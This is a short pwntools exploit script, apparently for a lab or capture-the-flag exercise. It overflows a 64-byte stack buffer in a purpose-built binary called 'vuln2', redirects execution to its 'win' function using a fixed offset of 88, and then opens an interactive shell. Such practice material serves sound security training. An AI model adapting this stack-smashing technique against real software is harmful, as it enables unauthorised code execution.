# Exploit for vuln2: Memcpy Stack Overflow (Ret2Win)
from pwn import *
import os

binary_path = os.path.abspath('../build/vuln2')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln2 (Memcpy -> Ret2Win)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")

# Buffer is 64 bytes.
# Saved RBP is at +64 / +72 (depends on alignment).
# Return Address follows.
# Simple overflow pattern: Padding + Return Address

# Create payload
# Offset found via GDB is 88 (likely aligned to 16 bytes + padding)
offset = 88

log.info(f"Using offset: {offset}")

p = process(binary_path)

payload = flat({offset: win_addr})
# Fill to 256 bytes to satisfy read() fully so it returns without closing stdin
if len(payload) < 256:
    payload += b'A' * (256 - len(payload))

# Send payload
p.send(payload)
# Do NOT shutdown send, otherwise shell will exit immediately on EOF
# p.shutdown('send')

p.recvuntil(b"Done\n")
log.success("Exploit sent. Check for shell...")
p.interactive()


